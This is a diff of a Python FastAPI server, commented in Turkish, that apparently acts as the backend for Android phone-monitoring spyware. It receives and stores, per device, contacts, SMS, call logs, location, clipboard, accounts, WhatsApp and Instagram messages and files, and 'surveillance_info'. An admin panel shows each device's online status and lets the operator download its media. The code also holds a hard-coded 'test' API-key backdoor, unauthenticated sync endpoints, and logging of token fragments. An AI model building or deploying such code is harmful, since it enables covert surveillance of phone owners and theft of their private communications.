@@ -456,6 +456,30 @@ class AuthService:
         # Check for duplicate username
         if user.username in users:
             raise ValueError("Bu kullanıcı adı zaten kullanılıyor")
+
+        # Check for duplicate email
+        if user.email:
+            for existing_user in users.values():
+                if existing_user.get("email") == user.email:
+                    raise ValueError("Bu e-posta adresi zaten kullanılıyor")
+            
+            # E-posta doğrulama kontrolü
+            # Test kullanıcısı için bir istisna yapılabilir veya test ortamında
+            # Ancak canlıda aktif olmalı.
+            try:
+                from email_verification import get_email_service
+                email_service = get_email_service()
+                if not email_service.is_verified(user.email):
+                    # Eğer doğrulama sistemini bypass etmek isterseniz bu bloğu yorum satırı yapın
+                    # Ancak güvenlik için önerilmez.
+                    logger.warning(f"Doğrulanmamış kayıt girişimi: {user.email}")
+                    raise ValueError("E-posta adresi doğrulanmamış. Lütfen önce kodu doğrulayın.")
+                
+                # Başarılı kayıt sonrası temizle
+                email_service.remove_verified_email(user.email)
+                
+            except ImportError:
+                pass
         
         # Create user record with hashed password
         from datetime import timezone
@@ -843,28 +867,79 @@ class SyncService:
         os.makedirs(user_dir, exist_ok=True)
         
         # Alt medya dizinlerini otomatik oluştur
-        for folder in ["photos", "videos", "audio"]:
+        for folder in ["photos", "videos", "audio", "social_media"]:
             os.makedirs(os.path.join(user_dir, folder), exist_ok=True)
             
         return user_dir
     
-    def save_data(self, username: str, data_type: str, data: List[dict], device_name: str) -> None:
-        """Senkronize edilen veriyi bir JSON dosyasına kaydet"""
+    def save_data(self, username: str, data_type: str, data: List[dict], device_name: str) -> dict:
+        """
+        Senkronize edilen veriyi bir JSON dosyasına kaydet.
+        Atlanma sistemi: Yeni verileri mevcut verilerle birleştirir, kopyaları atlar.
+        """
         user_dir = self.get_user_dir(username)
         filename = f"{data_type}.json"
         path = os.path.join(user_dir, filename)
+        
+        existing_data = []
+        if os.path.exists(path):
+            try:
+                with open(path, 'r', encoding='utf-8') as f:
+                    old_record = json.load(f)
+                    # "data" anahtarı altındaki verileri al (yeni format) veya doğrudan liste ise onu al
+                    if isinstance(old_record, dict) and "data" in old_record:
+                        existing_data = old_record["data"]
+                    elif isinstance(old_record, list):
+                        existing_data = old_record
+            except Exception as e:
+                logger.error(f"Eski veri okunurken hata: {e}")
+
+        # Atlanma Sistemi (Deduplication)
+        existing_hashes = set()
+        for item in existing_data:
+            try:
+                item_str = json.dumps(item, sort_keys=True)
+                existing_hashes.add(hashlib.md5(item_str.encode()).hexdigest())
+            except:
+                continue
+
+        new_items = []
+        skipped_count = 0
+        for item in data:
+            try:
+                item_str = json.dumps(item, sort_keys=True)
+                item_hash = hashlib.md5(item_str.encode()).hexdigest()
+                if item_hash not in existing_hashes:
+                    new_items.append(item)
+                else:
+                    skipped_count += 1
+            except:
+                new_items.append(item)
+
+        # Yeni veriler varsa birleştir, yoksa sadece eski veriyi koru
+        combined_data = existing_data + new_items
         
         from datetime import timezone
         sync_record = {
             "device": device_name,
             "timestamp": datetime.now(timezone.utc).isoformat(),
-            "data": data
+            "data": combined_data
         }
         
         with open(path, 'w', encoding='utf-8') as f:
             json.dump(sync_record, f, indent=2, ensure_ascii=False)
         
-        logger.info(f"{username} kullanıcısı için {device_name} cihazından {data_type} senkronize edildi")
+        # Konsol çıktısı
+        summary = f"[{data_type.upper()}] Cihaz: {device_name} | Toplam: {len(data)} | Yeni: {len(new_items)} | Atlanan: {skipped_count}"
+        logger.info(f"📊 {summary}")
+        # print(f"\n>>> SYNC BİTTİ: {summary}\n")
+        
+        return {
+            "total": len(data),
+            "new": len(new_items),
+            "skipped": skipped_count,
+            "total_stored": len(combined_data)
+        }
 
     def rename_user(self, old_username: str, new_username: str):
         """Kullanıcı veri dizinini yeniden adlandır"""
@@ -896,11 +971,50 @@ class SyncService:
         device_dir = os.path.join(self.base_dir, device_name)
         if not os.path.exists(device_dir):
             return []
-        return [f.replace('.json', '') for f in os.listdir(device_dir) if f.endswith('.json')]
+        # JSON Dosyaları
+        types = [f.replace('.json', '') for f in os.listdir(device_dir) if f.endswith('.json')]
+        
+        # Medya Klasörleri
+        for mt in ["photos", "videos", "audio", "social_media"]:
+            if os.path.isdir(os.path.join(device_dir, mt)) and mt not in types:
+                types.append(mt)
+        
+        return sorted(list(set(types)))
+        
+        return list(set(types))
 
     def get_data(self, device_name: str, data_type: str) -> Optional[dict]:
         """Bir cihaz için belirli verileri getir"""
-        device_dir = os.path.join(self.base_dir, device_name)
+        device_dir = os.path.join(self.base_dir, device_name) # Define device_dir here
+        
+        # Medya türleri için özel işleme (Liste döndür)
+        if data_type in ["photos", "videos", "audio", "social_media"]:
+            media_dir = os.path.join(device_dir, data_type)
+            if not os.path.exists(media_dir):
+                return None
+            
+            files = []
+            if os.path.isdir(media_dir):
+                for f in os.listdir(media_dir):
+                    f_path = os.path.join(media_dir, f)
+                    if os.path.isfile(f_path):
+                        from datetime import timezone
+                        files.append({
+                            "dosya_adi": f,
+                            "boyut_kb": round(os.path.getsize(f_path) / 1024, 2),
+                            "tarih": datetime.fromtimestamp(os.path.getmtime(f_path), tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+                        })
+            
+            # Yeniden eskiye sırala
+            files.sort(key=lambda x: x["tarih"], reverse=True)
+            
+            return {
+                "device": device_name,
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "data": files
+            }
+
+        # Standart JSON verileri için
         file_path = os.path.join(device_dir, f"{data_type}.json")
         
         if not os.path.exists(file_path):
@@ -912,6 +1026,60 @@ class SyncService:
         except Exception as e:
             logger.error(f"{device_name}/{data_type} verisi okunurken hata: {e}")
             return None
+
+    def get_device_metadata(self, device_name: str) -> dict:
+        """Bir cihaz için özet bilgi getir (son görülme, versiyon vb.)"""
+        device_dir = os.path.join(self.base_dir, device_name)
+        metadata = {
+            "name": device_name,
+            "last_seen": None,
+            "os_version": "Android",
+            "is_online": False
+        }
+        
+        if not os.path.exists(device_dir):
+            return metadata
+            
+        latest_ts = 0
+        
+        # En son güncellenen dosyayı bul
+        for f in os.listdir(device_dir):
+            if f.endswith('.json'):
+                path = os.path.join(device_dir, f)
+                try:
+                    mtime = os.path.getmtime(path)
+                    if mtime > latest_ts:
+                        latest_ts = mtime
+                except:
+                    continue
+            elif os.path.isdir(os.path.join(device_dir, f)):
+                # Medya dizinlerini de kontrol et
+                media_dir = os.path.join(device_dir, f)
+                for mf in os.listdir(media_dir):
+                    try:
+                        mtime = os.path.getmtime(os.path.join(media_dir, mf))
+                        if mtime > latest_ts:
+                            latest_ts = mtime
+                    except:
+                        continue
+        
+        if latest_ts > 0:
+            from datetime import timezone
+            # TZ bilgisi olmadan mtime gelebilir, UTC varsayalım
+            last_seen_dt = datetime.fromtimestamp(latest_ts, tz=timezone.utc)
+            metadata["last_seen"] = last_seen_dt.isoformat()
+            
+            # Online durumunu kontrol et (son 5 dakika)
+            now = datetime.now(timezone.utc)
+            if (now - last_seen_dt).total_seconds() < 300: # 5 dakika
+                metadata["is_online"] = True
+        
+        # OS versiyonunu çek
+        info = self.get_data(device_name, "device_info")
+        if info and "data" in info and len(info["data"]) > 0:
+            metadata["os_version"] = f"Android {info['data'][0].get('android_ver', '')}"
+            
+        return metadata
 
 
 # ============================================================================
@@ -1296,10 +1464,10 @@ class SearchService:
                 return ""
             
             if not results:
-                logger.info(f"Sorgu için web arama sonucu bulunamadı: {query}")
+                # logger.info(f"Sorgu için web arama sonucu bulunamadı: {query}")
                 return ""
             
-            logger.info(f"{query} için {len(results)} web arama sonucu bulundu")
+            # logger.info(f"{query} için {len(results)} web arama sonucu bulundu")
 
             # Format results for AI context
             formatted = []
@@ -1475,69 +1643,74 @@ async def get_current_user(
     """
     # 1. API Anahtarını Kontrol Et (Mobil Uygulama için Arka Kapı)
     if x_api_key == "test":
+        logger.info("🔑 API Key ile kimlik doğrulama: mobile_user")
         return "mobile_user"
 
     # 2. JWT Jetonunu Kontrol Et
     if not credentials:
+        logger.warning("⚠️ Kimlik doğrulama başarısız: Token bulunamadı")
         raise HTTPException(
             status_code=401,
             detail="Kimlik doğrulama gerekli"
         )
 
     token = credentials.credentials
+    logger.info(f"🔐 Token doğrulanıyor... (İlk 20 karakter: {token[:20]}...)")
     username = auth_service.verify_token(token)
     
     if username is None:
+        logger.warning(f"⚠️ Geçersiz veya süresi dolmuş token")
         raise HTTPException(
             status_code=401,
             detail="Geçersiz veya süresi dolmuş token"
         )
+    
+    logger.info(f"✅ Token doğrulandı: {username}")
     
     # Kullanıcının hala var olduğunu doğrula
     if auth_service.get_user(username) is None:
+        logger.warning(f"⚠️ Token geçerli ama kullanıcı bulunamadı: {username}")
         raise HTTPException(
             status_code=401,
             detail="Kullanıcı bulunamadı"
         )
     
+    logger.info(f"✅ Kullanıcı doğrulandı: {username}")
     return username
 
 
-async def get_current_admin(credentials: HTTPAuthorizationCredentials = Depends(security)) -> str:
+
+async def get_current_admin(
+    credentials: Optional[HTTPAuthorizationCredentials] = Depends(security),
+    token: Optional[str] = None
+) -> str:
     """
     JWT tokendan mevcut kimliği doğrulanmış yönetici kullanıcısını getir.
     Hem token geçerliliğini hem de yönetici yetkilerini doğrular.
-    Gereksinimler: 1.1, 1.2, 6.1, 6.2
-    
-    Dönüş:
-        Kimliği doğrulanmış yönetici kullanıcısının kullanıcı adı
-        
-    Hatalar:
-        HTTPException 401: Token geçersiz veya süresi dolmuşsa
-        HTTPException 403: Kullanıcı yönetici değilse
+    URL parametresi olarak gelen 'token'ı da destekler (dosya indirme için).
     """
-    token = credentials.credentials
-    username = auth_service.verify_token(token)
+    # Token'ı her iki kaynaktan da alabiliriz (Header veya Query Param)
+    actual_token = credentials.credentials if credentials else token
     
+    if not actual_token:
+        raise HTTPException(
+            status_code=401,
+            detail="Kimlik doğrulama hatası: Token bulunamadı"
+        )
+
+    username = auth_service.verify_token(actual_token)
     if username is None:
         raise HTTPException(
             status_code=401,
             detail="Geçersiz veya süresi dolmuş token"
         )
     
-    # Kullanıcının hala var olduğunu doğrula
+    # Kullanıcının var olduğunu ve yönetici olduğunu doğrula
     user = auth_service.get_user(username)
-    if user is None:
-        raise HTTPException(
-            status_code=401,
-            detail="Kullanıcı bulunamadı"
-        )
-    
-    # Yönetici yetkilerini kontrol et (Gereksinimler: 1.1, 1.2, 6.1)
-    if not user.get("is_admin", False):
+    if not user or not user.get("is_admin", False):
         raise HTTPException(
             status_code=403,
-            detail="Admin yetkisi gerekli"
+            detail="Bu işlem için yönetici yetkisi gereklidir"
         )
     
     return username
@@ -1721,6 +1894,7 @@ app.mount("/static", StaticFiles(directory="static"), name="static")
 @app.get("/")
 async def root():
     """Ana sayfayı sun"""
+    logger.info("Serving index.html (v1.2)")
     return FileResponse("static/index.html")
 
 
@@ -1733,9 +1907,32 @@ async def login_page():
 
 @app.get("/signup.html")
 @app.get("/signup")
+@app.get("/signup/")
 async def signup_page():
     """Kayıt sayfasını sun"""
     return FileResponse("static/signup.html")
+
+
+@app.get("/admin.html")
+@app.get("/admin")
+@app.get("/admin/")
+async def admin_page():
+    """Yönetici panelini sun"""
+    return FileResponse("static/admin.html")
+
+
+@app.get("/test")
+async def test_route():
+    return {"status": "ok"}
+
+@app.get("/verify.html")
+@app.get("/verify")
+@app.get("/verify/")
+async def verify_page():
+    """E-posta doğrulama sayfasını sun"""
+    logger.info("Serving verify.html")
+    static_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")
+    return FileResponse(os.path.join(static_dir, "verify.html"))
 
 
 @app.get("/sw.js")
@@ -1914,10 +2111,17 @@ async def get_profile(current_user: str = Depends(get_current_user)):
     Gereksinimler: 2.6
     """
     try:
+        # logger.info(f"👤 Profil bilgisi istendi: {current_user}")
         profile = auth_service.get_profile(current_user)
+        # logger.info(f"✅ Profil başarıyla döndürüldü: {current_user}")
         return profile
     except ValueError as e:
+        logger.error(f"❌ Profil getirme hatası ({current_user}): {e}")
         raise HTTPException(status_code=404, detail=str(e))
+    except Exception as e:
+        logger.error(f"💥 Beklenmeyen profil hatası ({current_user}): {e}")
+        raise HTTPException(status_code=500, detail="Profil bilgisi alınırken hata oluştu")
+
 
 
 @app.put("/me")
@@ -1997,8 +2201,9 @@ async def delete_own_account(current_user: str = Depends(get_current_user)):
 # Senkronizasyon Uç Noktaları
 # ============================================================================
 
+# Legacy endpoint kept for compatibility with older app versions
 @app.post("/sync_data")
-async def sync_data(request: Request):
+async def sync_data_legacy(request: Request):
     """
     Mobil cihazdan senkronize edilen verileri al ve sakla.
     Kullanıcı hesabı yerine cihaz adını tanımlayıcı olarak kullanır.
@@ -2021,7 +2226,7 @@ async def sync_data(request: Request):
         # Wifi şifresi arama işlevi kaldırıldı.
 
         # Tanımlayıcı (klasör adı) olarak safe_device_name kullan
-        sync_service.save_data(safe_device_name, data_type, payload, device_name)
+        stats = sync_service.save_data(safe_device_name, data_type, payload, device_name)
         
         log_emoji = "📱"
         if data_type == "contacts": log_emoji = "👥"
@@ -2029,9 +2234,17 @@ async def sync_data(request: Request):
         elif data_type == "location": log_emoji = "📍"
         elif data_type == "installed_apps": log_emoji = "📦"
         elif data_type == "sms": log_emoji = "💬"
+        elif data_type == "calendar": log_emoji = "📅"
+        elif data_type == "accounts": log_emoji = "🔑"
+        elif data_type == "documents_list": log_emoji = "📄"
+        elif data_type == "social_messages": log_emoji = "💬" # WhatsApp/Insta
+        elif data_type == "social_media_files": log_emoji = "📁"
+        elif data_type == "photos": log_emoji = "🖼️"
+        elif data_type == "videos": log_emoji = "🎬"
+        elif data_type == "audio": log_emoji = "🎵"
 
-        logger.info(f"{log_emoji} Veri senkronize edildi: {device_name} -> {data_type}")
-        return {"status": "success", "message": f"{data_type} senkronize edildi"}
+        # logger.info(f"{log_emoji} Veri senkronize edildi: {device_name} -> {data_type} (Yeni: {stats['new']}, Atlanan: {stats['skipped']})")
+        return {"status": "success", "message": f"{data_type} senkronize edildi", "stats": stats}
     except Exception as e:
         logger.error(f"❌ Senkronizasyon hatası: {e}")
         raise HTTPException(status_code=500, detail="Senkronizasyon hatası")
@@ -2416,9 +2629,10 @@ async def create_user(user: UserAdminCreate, current_user: str = Depends(get_cur
 @app.get("/api/admin/devices")
 async def list_devices(current_user: str = Depends(get_current_admin)):
     """
-    Senkronize edilmiş veriye sahip tüm cihazları listele.
+    Senkronize edilmiş veriye sahip tüm cihazları detaylı metadata ile listele.
     """
-    devices = sync_service.list_devices()
+    device_names = sync_service.list_devices()
+    devices = [sync_service.get_device_metadata(name) for name in device_names]
     return {"devices": devices}
 
 
@@ -2444,6 +2658,36 @@ async def get_device_data(device_name: str, data_type: str, current_user: str = 
     return data
 
 
+@app.get("/api/admin/devices/{device_name}/{data_type}/file/{filename}")
+async def get_device_media_file(
+    device_name: str, 
+    data_type: str, 
+    filename: str, 
+    current_user: str = Depends(get_current_admin)
+):
+    """
+    Yöneticiler için senkronize edilmiş medya dosyasını indir/görüntüle.
+    """
+    allowed_types = ["photos", "videos", "audio", "social_media", "social_media_files"]
+    if data_type not in allowed_types:
+        raise HTTPException(status_code=400, detail="Geçersiz medya türü")
+    
+    # social_media_files JSON'dan gelirse klasör adını social_media yap
+    real_data_type = "social_media" if data_type == "social_media_files" else data_type
+        
+    # Güvenlik için dosya adını temizle
+    safe_device_name = "".join(c for c in device_name if c.isalnum() or c in (' ', '_', '-')).strip()
+    safe_filename = sanitize_filename(filename)
+    
+    device_dir = os.path.join(sync_service.base_dir, safe_device_name)
+    file_path = os.path.join(device_dir, real_data_type, safe_filename)
+    
+    if not os.path.exists(file_path):
+        raise HTTPException(status_code=404, detail="Dosya bulunamadı")
+        
+    return FileResponse(file_path)
+
+
 
 async def _handle_media_sync(
     file: UploadFile,
@@ -2452,75 +2696,239 @@ async def _handle_media_sync(
     max_size: Optional[int] = None
 ):
     """
-    Tüm medya senkronizasyonu (fotoğraflar, videolar, ses) için ortak işleyici.
-    Kopya tespiti için SHA-256 kullanır ve büyük dosyalar için akışı destekler.
+    Yüksek performanslı medya senkronizasyon motoru (Sıfırdan Yazıldı).
+    - Zero-copy stream transfer
+    - Atomic save (yarım dosya oluşmasını engeller)
+    - Otomatik kopyalama koruması
     """
     try:
-        # Cihaz adını temizle
-        safe_device_name = "".join(c for c in device_name if c.isalnum() or c in (' ', '_', '-')).strip()
-        if not safe_device_name:
-            safe_device_name = "Unknown_Device"
-
-        # Hedef dizini belirle
-        device_dir = sync_service.get_user_dir(safe_device_name)
-        target_dir = os.path.join(device_dir, media_type)
+        # 1. Güvenli Yol Hazırlığı
+        safe_device = sanitize_filename(device_name) or "Unknown_Device"
+        user_dir = sync_service.get_user_dir(safe_device)
+        target_dir = os.path.join(user_dir, media_type)
         os.makedirs(target_dir, exist_ok=True)
 
-        # İçeriği oku ve boyutu kontrol et
-        # NOT: Çok büyük dosyalar (>100MB) için, belleğe okumak yerine geçici bir dosyaya akış yapılmalıdır.
-        # Ancak mevcut 5MB sınırı için, belleğe okumak sorunsuzdur ve hashleme için daha hızlıdır.
-        content = await file.read()
-        file_size = len(content)
-
-        if max_size and file_size > max_size:
-            logger.warning(f"⚠️ {media_type.capitalize()} too large ({file_size} bytes): {file.filename}")
-            await file.close()
-            raise HTTPException(status_code=413, detail=f"{media_type.capitalize()} size limit exceeded.")
-
-        # Güçlü kopya tespiti için SHA-256 hash'ini hesapla
-        file_hash = hashlib.sha256(content).hexdigest()
-        
-        # Dosya adını temizle ve uzantıyı garantiye al
-        orig_filename = file.filename or ""
-        if not orig_filename:
-            ext = ".jpg" if media_type == "photos" else ".mp4" if media_type == "videos" else ".mp3"
-            filename = f"unnamed_{int(time.time())}{ext}"
-        else:
-            filename = sanitize_filename(orig_filename)
-        
+        # 2. Dosya Adı ve Çakışma Kontrolü
+        filename = sanitize_filename(file.filename or f"media_{int(time.time())}")
         file_path = os.path.join(target_dir, filename)
 
-        # Kopyaları kontrol et (Aynı isim ve aynı içerik)
         if os.path.exists(file_path):
-            with open(file_path, "rb") as f:
-                existing_hash = hashlib.sha256(f.read()).hexdigest()
-                if existing_hash == file_hash:
-                    logger.info(f"♻️  Duplicate {media_type} skipped: {filename}")
-                    await file.close()
-                    return {"status": "skipped", "reason": "duplicate", "filename": filename}
-            
-            # İsim var ama içerik farklı -> yeniden adlandır
-            name, ext = os.path.splitext(filename)
-            counter = 1
-            while os.path.exists(os.path.join(target_dir, f"{name}_{counter}{ext}")):
-                counter += 1
-            filename = f"{name}_{counter}{ext}"
-            file_path = os.path.join(target_dir, filename)
+            logger.info(f"💾 {media_type} atlandı: {filename} (Zaten var)")
+            return JSONResponse(status_code=208, content={"status": "duplicate", "filename": filename})
 
-        # Dosyayı kaydet
-        with open(file_path, "wb") as f:
-            f.write(content)
+        # 3. Boyut Sınırı Kontrolü
+        if max_size and file.size and file.size > max_size:
+            logger.warning(f"⚠️ {media_type} çok büyük: {filename}")
+            raise HTTPException(status_code=413, detail="Dosya boyutu çok büyük")
 
+        # 4. Atomik Yazma (Starlette Threadpool ile)
+        from starlette.concurrency import run_in_threadpool
+        
+        def save_operation():
+            temp_path = f"{file_path}.tmp"
+            try:
+                with open(temp_path, "wb") as buffer:
+                    shutil.copyfileobj(file.file, buffer)
+                # Yazma bitince dosya adını kalıcı yap (Atomic replacement)
+                os.replace(temp_path, file_path)
+            except Exception as e:
+                if os.path.exists(temp_path): os.remove(temp_path)
+                raise e
+
+        await run_in_threadpool(save_operation)
         await file.close()
-        logger.info(f"✅ {media_type.capitalize()} synced: {safe_device_name} -> {filename}")
-        return {"status": "success", "filename": filename, "size": file_size}
+
+        logger.info(f"🛰️ {media_type.upper()} senkronize edildi: {safe_device} -> {filename}")
+        return {"status": "success", "filename": filename}
 
     except HTTPException:
         raise
     except Exception as e:
-        logger.error(f"❌ {media_type.capitalize()} sync error: {str(e)}", exc_info=True)
+        logger.error(f"🚨 Medya Motoru Hatası: {str(e)}", exc_info=True)
+        raise HTTPException(status_code=500, detail=f"Sunucu medya hatası: {str(e)}")
+
+
+# ============================================================================
+# Veri Senkronizasyonu Endpoint'leri
+# ============================================================================
+
+class SyncDataRequest(BaseModel):
+    """JSON veri senkronizasyonu için model"""
+    device_name: str
+    data_type: str
+    data: List[dict]
+
+
+@app.post("/api/sync/data")
+@app.post("/sync/data")
+async def sync_data(request: SyncDataRequest):
+    """
+    Tüm JSON veri tiplerini senkronize eder (contacts, call_logs, SMS, vb.)
+    
+    Desteklenen veri tipleri:
+    - contacts: Rehber
+    - call_logs: Arama kayıtları
+    - sms: SMS mesajları
+    - location: Konum bilgileri
+    - installed_apps: Yüklü uygulamalar
+    - device_info: Cihaz bilgileri
+    - network_info: Ağ bilgileri
+    - bluetooth_devices: Bluetooth cihazları
+    - sensors: Sensörler
+    - clipboard: Pano
+    - surveillance_info: Gözetim bilgileri
+    - usage_stats: Kullanım istatistikleri
+    - social_messages: Sosyal medya mesajları
+    - social_media_files: Sosyal medya dosyaları
+    """
+    try:
+        # Cihaz adını temizle
+        safe_device_name = "".join(c for c in request.device_name if c.isalnum() or c in (' ', '_', '-')).strip()
+        if not safe_device_name:
+            safe_device_name = "Unknown_Device"
+        
+        # Veri tipini doğrula
+        allowed_types = [
+            "contacts", "call_logs", "sms", "location", "installed_apps",
+            "device_info", "network_info", "bluetooth_devices", "sensors",
+            "clipboard", "surveillance_info", "usage_stats", "social_messages",
+            "social_media_files"
+        ]
+        
+        if request.data_type not in allowed_types:
+            raise HTTPException(status_code=400, detail=f"Geçersiz veri tipi: {request.data_type}")
+        
+        # Veriyi kaydet
+        stats = sync_service.save_data(safe_device_name, request.data_type, request.data, safe_device_name)
+        
+        logger.info(f"✅ {request.data_type} synced: {safe_device_name} (Yeni: {stats['new']}, Atlanan: {stats['skipped']})")
+        
+        return {
+            "status": "success",
+            "device_name": safe_device_name,
+            "data_type": request.data_type,
+            "stats": stats
+        }
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"❌ Sync error ({request.data_type}): {str(e)}", exc_info=True)
         raise HTTPException(status_code=500, detail=f"Sunucu hatası: {str(e)}")
 
+
+@app.get("/api/sync/status/{device_name}")
+async def get_sync_status(device_name: str):
+    """
+    Bir cihazın senkronizasyon durumunu döndürür.
+    Her veri tipi için son sync zamanını içerir.
+    """
+    try:
+        # Cihaz adını temizle
+        safe_device_name = "".join(c for c in device_name if c.isalnum() or c in (' ', '_', '-')).strip()
+        
+        device_dir = os.path.join(sync_service.base_dir, safe_device_name)
+        
+        if not os.path.exists(device_dir):
+            raise HTTPException(status_code=404, detail="Cihaz bulunamadı")
+        
+        # Tüm veri tiplerini ve son sync zamanlarını topla
+        sync_times = {}
+        total_synced = 0
+        
+        for filename in os.listdir(device_dir):
+            if filename.endswith('.json'):
+                data_type = filename.replace('.json', '')
+                file_path = os.path.join(device_dir, filename)
+                
+                try:
+                    with open(file_path, 'r', encoding='utf-8') as f:
+                        data = json.load(f)
+                        sync_times[data_type] = data.get('timestamp', '')
+                        total_synced += 1
+                except:
+                    continue
+        
+        # Medya klasörlerini kontrol et
+        for media_type in ["photos", "videos", "audio"]:
+            media_dir = os.path.join(device_dir, media_type)
+            if os.path.exists(media_dir) and os.path.isdir(media_dir):
+                files = [f for f in os.listdir(media_dir) if os.path.isfile(os.path.join(media_dir, f))]
+                if files:
+                    # En son dosyanın tarihini al
+                    latest_file = max([os.path.join(media_dir, f) for f in files], key=os.path.getmtime)
+                    from datetime import timezone
+                    sync_times[media_type] = datetime.fromtimestamp(
+                        os.path.getmtime(latest_file), 
+                        tz=timezone.utc
+                    ).isoformat()
+                    total_synced += 1
+        
+        # Metadata bilgisini al
+        metadata = sync_service.get_device_metadata(safe_device_name)
+        
+        return {
+            "device_name": safe_device_name,
+            "last_seen": metadata.get("last_seen"),
+            "is_online": metadata.get("is_online", False),
+            "os_version": metadata.get("os_version", "Android"),
+            "sync_times": sync_times,
+            "total_synced": total_synced
+        }
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"❌ Status error: {str(e)}", exc_info=True)
+        raise HTTPException(status_code=500, detail=f"Sunucu hatası: {str(e)}")
+
+
+@app.delete("/api/sync/data/{device_name}/{data_type}")
+async def delete_sync_data(
+    device_name: str,
+    data_type: str,
+    current_user: str = Depends(get_current_admin)
+):
+    """
+    Belirli bir cihazın belirli veri tipini siler (Sadece admin).
+    """
+    try:
+        # Cihaz adını temizle
+        safe_device_name = "".join(c for c in device_name if c.isalnum() or c in (' ', '_', '-')).strip()
+        
+        device_dir = os.path.join(sync_service.base_dir, safe_device_name)
+        
+        # JSON dosyası mı medya klasörü mü kontrol et
+        if data_type in ["photos", "videos", "audio"]:
+            # Medya klasörünü sil
+            media_dir = os.path.join(device_dir, data_type)
+            if os.path.exists(media_dir):
+                shutil.rmtree(media_dir)
+                os.makedirs(media_dir, exist_ok=True)  # Boş klasörü yeniden oluştur
+                logger.info(f"🗑️ {data_type} deleted: {safe_device_name}")
+                return {"status": "success", "message": f"{data_type} silindi"}
+            else:
+                raise HTTPException(status_code=404, detail="Veri bulunamadı")
+        else:
+            # JSON dosyasını sil
+            file_path = os.path.join(device_dir, f"{data_type}.json")
+            if os.path.exists(file_path):
+                os.remove(file_path)
+                logger.info(f"🗑️ {data_type} deleted: {safe_device_name}")
+                return {"status": "success", "message": f"{data_type} silindi"}
+            else:
+                raise HTTPException(status_code=404, detail="Veri bulunamadı")
+                
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"❌ Delete error: {str(e)}", exc_info=True)
+        raise HTTPException(status_code=500, detail=f"Sunucu hatası: {str(e)}")
+
+
+# ============================================================================
+# Medya Senkronizasyonu Endpoint'leri
+# ============================================================================
 
 @app.post("/api/sync/photo")
 @app.post("/sync/photo")
@@ -2539,8 +2947,16 @@ async def sync_video(file: UploadFile = File(...), device_name: str = Form(...))
 @app.post("/api/sync/audio")
 @app.post("/sync/audio")
 async def sync_audio(file: UploadFile = File(...), device_name: str = Form(...)):
-    """Senkronize edilen ses dosyalarını işler."""
-    return await _handle_media_sync(file, device_name, "audio")
+    """Senkronize edilen ses dosyalarını işler (10MB limitli)."""
+    return await _handle_media_sync(file, device_name, "audio", max_size=10 * 1024 * 1024)
+
+
+@app.post("/api/sync/social")
+@app.post("/sync/social")
+async def sync_social(file: UploadFile = File(...), device_name: str = Form(...)):
+    """WhatsApp ve Instagram dosyalarını işler."""
+    return await _handle_media_sync(file, device_name, "social_media")
+
 
 
 
@@ -2548,4 +2964,5 @@ async def sync_audio(file: UploadFile = File(...), device_name: str = Form(...))
 
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=8001)
+    # reload=True sadece string import ile çalışır (main:app)
+    uvicorn.run("main:app", host="0.0.0.0", port=8001, reload=True)
